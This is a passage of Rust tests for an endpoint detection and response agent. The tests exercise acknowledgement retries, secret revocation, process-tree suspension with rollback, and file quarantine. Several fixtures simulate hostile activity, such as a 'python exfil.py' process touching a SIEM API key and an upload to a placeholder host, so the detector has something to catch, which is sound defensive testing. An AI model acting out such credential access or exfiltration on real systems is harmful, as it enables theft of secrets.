            request.api_key.as_deref(),
            Some("configured-control-api-key")
        );
        assert_eq!(request.body["ackToken"], "configured-control-ack-token");
        assert_eq!(request.body["status"], "acknowledged");
        assert_eq!(
            request.body["rawPayload"]["localExecutionId"],
            action_payload["execution"]["executionId"]
        );
        assert!(request.body["rawPayload"]["signedReceipt"].is_object());
        assert_eq!(
            request.body["rawPayload"]["signedReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_acknowledgement"
        );

        let local_ack_json = serde_json::to_string(&acknowledgement_payload)
            .unwrap_or_else(|e| panic!("failed to serialize configured acknowledgement: {e}"));
        assert!(!local_ack_json.contains("configured-control-api-key"));
        assert!(!local_ack_json.contains("configured-control-ack-token"));

        drop(requests);
        control_api_task.abort();
    }

    #[tokio::test]
    async fn failed_control_ack_postback_is_queued_and_retried_without_api_key() {
        let state = Arc::new(test_state());
        let retry_path = test_control_ack_postback_retry_path();
        {
            let mut retry_ledger = state.edr_control_ack_postback_retry_ledger.lock().await;
            *retry_ledger = EndpointControlAckPostbackRetryLedger::open(retry_path.clone())
                .unwrap_or_else(|err| panic!("failed to open control ack retry ledger: {err}"));
        }
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_ack().await;
        *control_api_state.failures_remaining.lock().await = 1;
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = None;
        }
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .route(
                "/api/v1/agent/edr/control-ack-postbacks/retry",
                post(agent_edr_control_ack_postbacks_retry),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-control-ack-retry-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "control-ack-retry.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://control-ack-retry.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build retry findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("retry findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "collect_evidence",
            "process": {
                "processGuid": "proc-control-ack-retry-1"
            },
            "ttlSeconds": 600,
            "reason": "collect evidence before retrying control acknowledgement",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build retry response-action request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("retry response-action request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read retry response-action body: {e}"));
        let action_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode retry action response: {e}"));
        let execution_id = action_payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing retry execution id"));

        let response_action_id = "33333333-3333-4333-8333-333333333333";
        let body = serde_json::json!({
            "acknowledgedBy": "local-agent",
            "note": "retry Control API postback",
            "control": {
                "responseActionId": response_action_id,
                "deliveryId": "44444444-4444-4444-8444-444444444444",
                "targetKind": "endpoint",
                "targetId": "test-agent",
                "ackToken": "retry-control-ack-token",
                "status": "acknowledged",
                "resultingState": "collect_evidence:succeeded"
            }
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build retry acknowledgement request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("retry acknowledgement request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read retry acknowledgement response: {e}"));
        let acknowledgement_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode retry acknowledgement response: {e}"));
        assert_eq!(
            acknowledgement_payload["controlPostback"]["accepted"],
            serde_json::Value::Bool(false)
        );
        assert_eq!(
            acknowledgement_payload["controlPostback"]["retryQueued"],
            serde_json::Value::Bool(true)
        );
        assert_ne!(
            acknowledgement_payload["acknowledgement"]["controlCorrelation"]["ackTokenHash"],
            serde_json::Value::String("retry-control-ack-token".to_string())
        );

        let retry_queue_before = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|e| panic!("failed to read retry queue before retry: {e}"));
        assert!(retry_queue_before.contains("retry-control-ack-token"));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&retry_path)
                .unwrap_or_else(|e| panic!("failed to stat retry queue: {e}"))
                .permissions()
                .mode()
                & 0o777;
            assert_eq!(mode, 0o600);
        }
        let mut shadow_ack_retries: serde_json::Value = serde_json::from_str(&retry_queue_before)
            .unwrap_or_else(|err| panic!("failed to decode control ack retry queue: {err}"));
        {
            let shadow_ack_retry = shadow_ack_retries
                .as_array_mut()
                .and_then(|entries| entries.first_mut())
                .unwrap_or_else(|| panic!("missing control ack retry queue entry"));
            shadow_ack_retry
                .as_object_mut()
                .unwrap_or_else(|| panic!("control ack retry queue entry was not an object"))
                .insert(
                    "shadowAckToken".to_string(),
                    serde_json::json!("shadow-ack-token"),
                );
            assert_unknown_field_rejected::<EndpointControlAckPostbackRetry>(
                shadow_ack_retry.clone(),
                "shadowAckToken",
            );
        }
        let shadow_ack_retry_path = test_control_ack_postback_retry_path();
        write_jsonl_value(&shadow_ack_retry_path, &shadow_ack_retries);
        let err = match read_control_ack_postback_retry_ledger(&shadow_ack_retry_path) {
            Ok(_) => panic!("expected shadow control ack retry queue rejection"),
            Err(err) => err,
        };
        assert_anyhow_error_mentions_unknown_field(err, "shadowAckToken");
        let _ = std::fs::remove_file(shadow_ack_retry_path);

        let retry_body = serde_json::json!({
            "force": true,
            "limit": 5
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/control-ack-postbacks/retry")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(retry_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build control ack retry request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("control ack retry request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read control ack retry response: {e}"));
        let retry_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode control ack retry response: {e}"));
        assert_eq!(retry_payload["attempted"], serde_json::Value::from(1));
        assert_eq!(retry_payload["delivered"], serde_json::Value::from(1));
        assert_eq!(retry_payload["pending"], serde_json::Value::from(0));

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 2);
        assert!(requests.iter().all(|request| request.api_key.is_none()));
        assert!(requests
            .iter()
            .all(|request| request.authorization.is_none()));
        assert!(requests
            .iter()
            .all(|request| request.response_action_id == response_action_id));
        assert_eq!(requests[1].body["ackToken"], "retry-control-ack-token");
        assert_eq!(requests[1].body["status"], "acknowledged");

        let retry_queue_after = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|e| panic!("failed to read retry queue after retry: {e}"));
        assert!(!retry_queue_after.contains("retry-control-ack-token"));

        control_api_task.abort();
    }

    #[tokio::test]
    async fn agent_edr_response_action_revokes_broker_capability_via_brokerd() {
        let state = Arc::new(test_state());
        let (brokerd_port, brokerd_state, brokerd_task) = spawn_mock_brokerd_revoke().await;
        {
            let mut settings = state.settings.write().await;
            settings.brokerd.enabled = true;
            settings.brokerd.port = brokerd_port;
            settings.brokerd.admin_token = Some("broker-admin-token".to_string());
        }

        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-broker-capability-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python agent.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("broker_capability".to_string()),
                path: None,
                name: Some("broker-capability:cap-response-123".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build broker capability findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("broker capability findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "revoke_grant",
            "process": {
                "processGuid": "proc-broker-capability-1"
            },
            "ttlSeconds": 600,
            "reason": "revoke touched broker capability credential",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build broker capability revoke request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("broker capability revoke request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read broker capability revoke response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode broker capability revoke response: {e}"));

        assert_eq!(payload["execution"]["action"], "revoke_grant");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            "broker_capability:cap-response-123"
        );
        let expected_hash = canonical_json_hash(
            &BrokerCapabilityRevokeReport {
                capability_id: "cap-response-123".to_string(),
                revoked: true,
                provider_revocation: Some(BrokerProviderTokenRevocationReport {
                    provider: "github".to_string(),
                    secret_ref_id: "github/prod".to_string(),
                    attempted: true,
                    supported: true,
                    revoked: true,
                    status_code: Some(204),
                    provider_token_hash: Some(sha256(b"ghs-provider-revoke").to_hex_prefixed()),
                    response_body_sha256: None,
                    reason: None,
                }),
            },
            "expected broker capability revoke result",
        )
        .unwrap_or_else(|e| panic!("failed to hash expected broker revoke result: {e}"));
        assert_eq!(
            payload["execution"]["effects"][0]["contentHash"],
            serde_json::Value::String(expected_hash)
        );
        assert_eq!(current_auth_token(&state), "test-token");
        assert!(auth_token_matches("test-token", &state));

        let requests = brokerd_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].capability_id, "cap-response-123");
        assert_eq!(
            requests[0].authorization.as_deref(),
            Some("Bearer broker-admin-token")
        );
        drop(requests);
        brokerd_task.abort();
    }

    #[tokio::test]
    async fn agent_edr_response_action_revokes_local_siem_api_key() {
        let state = Arc::new(test_state());
        {
            let mut settings = state.settings.write().await;
            settings.integrations.siem.provider = "datadog".to_string();
            settings.integrations.siem.endpoint = "https://us5.datadoghq.com".to_string();
            settings.integrations.siem.api_key = "dd-secret-123".to_string();
            settings.integrations.siem.enabled = true;
        }

        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-local-siem-key-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python exfil.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::ApiToken,
                path: Some("clawdstrike://integrations/siem/api_key".to_string()),
                name: Some("clawdstrike_siem_api_key".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build local SIEM key findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("local SIEM key findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "revoke_grant",
            "process": {
                "processGuid": "proc-local-siem-key-1"
            },
            "ttlSeconds": 600,
            "reason": "revoke touched local SIEM API key",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build local SIEM key revoke request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("local SIEM key revoke request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read local SIEM key revoke response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode local SIEM key revoke response: {e}"));

        assert_eq!(payload["execution"]["action"], "revoke_grant");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            "local_integration_secret:siem.api_key"
        );
        let expected_hash = canonical_json_hash(
            &LocalIntegrationSecretRevokeReport {
                secret: LocalIntegrationSecretKind::SiemApiKey,
                previous_secret_hash: sha256(b"dd-secret-123").to_hex_prefixed(),
                integration_disabled: true,
                revoked: true,
            },
            "expected local integration secret revoke result",
        )
        .unwrap_or_else(|e| panic!("failed to hash expected integration secret revoke: {e}"));
        assert_eq!(
            payload["execution"]["effects"][0]["contentHash"],
            serde_json::Value::String(expected_hash)
        );

        let settings = state.settings.read().await;
        assert!(settings.integrations.siem.api_key.is_empty());
        assert!(!settings.integrations.siem.enabled);
    }

    #[tokio::test]
    async fn revoke_local_integration_secret_grant_revokes_webhook_secret() {
        let state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.integrations.webhooks.url = "https://hooks.example.invalid/edr".to_string();
            settings.integrations.webhooks.secret = "webhook-secret-123".to_string();
            settings.integrations.webhooks.enabled = true;
        }

        let report = revoke_local_integration_secret_grant(
            &state,
            LocalIntegrationSecretKind::WebhooksSecret,
        )
        .await
        .unwrap_or_else(|err| panic!("failed to revoke webhook secret: {err:?}"));

        assert_eq!(report.secret, LocalIntegrationSecretKind::WebhooksSecret);
        assert_eq!(
            report.previous_secret_hash,
            sha256(b"webhook-secret-123").to_hex_prefixed()
        );
        assert!(report.integration_disabled);
        assert!(report.revoked);
        let settings = state.settings.read().await;
        assert!(settings.integrations.webhooks.secret.is_empty());
        assert!(!settings.integrations.webhooks.enabled);
        assert_eq!(
            settings.integrations.webhooks.url,
            "https://hooks.example.invalid/edr"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn agent_edr_response_action_executes_suspend_process_tree_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[100u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-suspend-process-tree-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state);
        let mut child = std::process::Command::new("/bin/sleep")
            .arg("30")
            .spawn()
            .unwrap_or_else(|e| panic!("failed to spawn sleep process: {e}"));
        std::thread::sleep(std::time::Duration::from_millis(100));
        assert!(
            child
                .try_wait()
                .unwrap_or_else(|e| panic!("failed to poll sleep process: {e}"))
                .is_none(),
            "sleep process exited before containment test"
        );
        let child_pid = child.id();
        let observation = EndpointObservation {
            process: EndpointProcess {
                pid: Some(child_pid),
                process_guid: Some("proc-suspend-tree-1".to_string()),
                image: Some("/bin/sleep".to_string()),
                command_line: Some("sleep 30".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/bin/sleep".to_string(),
                args: vec!["30".to_string()],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build suspend findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("suspend findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "suspend_process_tree",
            "process": {
                "processGuid": "proc-suspend-tree-1"
            },
            "ttlSeconds": 600,
            "reason": "contain process tree for 10 minutes",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build suspend response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("suspend response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read suspend response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode suspend response: {e}"));

        assert_eq!(payload["execution"]["action"], "suspend_process_tree");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["effectType"],
            "suspend_process_tree"
        );
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            format!("pid:{child_pid}")
        );
        assert_eq!(
            payload["execution"]["effects"][0]["byteCount"],
            serde_json::Value::from(1)
        );
        assert_eq!(
            payload["execution"]["effects"][0]["artifact"],
            format!("{child_pid}=guid:proc-suspend-tree-1")
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing suspend execution id"));
        let body = serde_json::json!({
            "reason": "resume suspended process tree"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build suspend rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("suspend rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read suspend rollback response: {e}"));
        let rollback_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode suspend rollback response: {e}"));
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "resume_process_tree"
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["target"],
            format!("pid:{child_pid}")
        );

        let rollback_receipt: SignedReceipt =
            serde_json::from_value(rollback_payload["receipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode suspend rollback receipt: {e}"));
        let rollback_decision = rollback_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing suspend rollback endpointDecision metadata"));
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("suspend_process_tree".to_string())
        );
        let expected_target = format!("pid:{child_pid}");
        let _ = child.kill();
        let _ = child.wait();
        assert_response_rollback_proof_target(
            app,
            execution_id,
            &payload,
            &expected_target,
            "suspend process tree",
        )
        .await;

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_rejects_live_terminate_process_tree() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(Arc::new(test_state()));
        let body = serde_json::json!({
            "action": "terminate_process_tree",
            "rootNodeId": "process:terminate-not-live",
            "ttlSeconds": 60,
            "reason": "terminate contained process tree should be rejected live",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build terminate response request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("terminate response request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read terminate response: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("terminate response error is not utf8: {e}"));
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "unexpected terminate live response status: {error}"
        );
        assert!(
            error.contains("safe response-engine slice")
                && !error.contains("terminate_process_tree can execute locally"),
            "unexpected terminate live rejection: {error}"
        );
    }

    #[test]
    fn process_tree_effect_pids_rejects_tampered_artifacts() {
        let mut effect = EndpointResponseExecutionEffect::suspend_process_tree(4242, &[4242]);
        effect.artifact = Some("9999".to_string());
        let err = match process_tree_effect_pids(&effect) {
            Ok(_) => panic!("tampered process tree effect unexpectedly passed validation"),
            Err(err) => err.to_string(),
        };
        assert!(err.contains("pid hash does not match"));

        let mut duplicate_effect =
            EndpointResponseExecutionEffect::suspend_process_tree(4242, &[4242]);
        duplicate_effect.artifact = Some("4242,4242".to_string());
        duplicate_effect.byte_count = Some(2);
        let err = match process_tree_effect_pids(&duplicate_effect) {
            Ok(_) => panic!("duplicate process tree effect unexpectedly passed validation"),
            Err(err) => err.to_string(),
        };
        assert!(err.contains("duplicate pids"));
    }

    #[test]
    fn process_signal_identity_binding_rejects_pid_only_and_mismatched_macos_pid() {
        let pid_only = validate_process_identity_binding(42, None)
            .expect_err("pid-only signal target must fail closed")
            .to_string();
        assert!(pid_only.contains("missing durable process identity"));

        let mismatched = validate_process_identity_binding(42, Some("guid:macos:43:9"))
            .expect_err("mismatched macOS pid identity must fail closed")
            .to_string();
        assert!(mismatched.contains("does not match live target pid 42"));

        validate_process_identity_binding(42, Some("guid:macos:42:9"))
            .expect("matching macOS pid identity should pass structural validation");
    }

    #[tokio::test]
    async fn agent_edr_response_action_executes_quarantine_file_with_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[84u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-quarantine-file-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel",
                post(agent_edr_response_execution_cancel),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .route(
                "/api/v1/agent/edr/response-acknowledgements",
                get(agent_edr_response_acknowledgements),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let source_path = std::env::temp_dir().join(format!(
            "clawdstrike-quarantine-source-{}-{counter}.txt",
            std::process::id()
        ));
        std::fs::write(&source_path, b"quarantine me")
            .unwrap_or_else(|e| panic!("failed to write quarantine source file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-quarantine-file-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build quarantine findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing quarantine file graph node"))
        };
        let body = serde_json::json!({
            "action": "quarantine_file",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "quarantine suspicious downloaded file",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build quarantine response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine response request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected quarantine response body: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine response: {e}"));

        assert_eq!(payload["plan"]["action"], "quarantine_file");
        assert_eq!(payload["execution"]["action"], "quarantine_file");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["effectType"],
            "quarantine_file"
        );
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let quarantine_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing quarantine artifact path")),
        );
        assert!(quarantine_path.is_file());
        assert_eq!(
            std::fs::read(&quarantine_path)
                .unwrap_or_else(|e| panic!("failed to read quarantined file: {e}")),
            b"quarantine me"
        );

        let execution_receipt: SignedReceipt =
            serde_json::from_value(payload["executionReceipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode quarantine execution receipt: {e}"));
        let endpoint_decision = execution_receipt
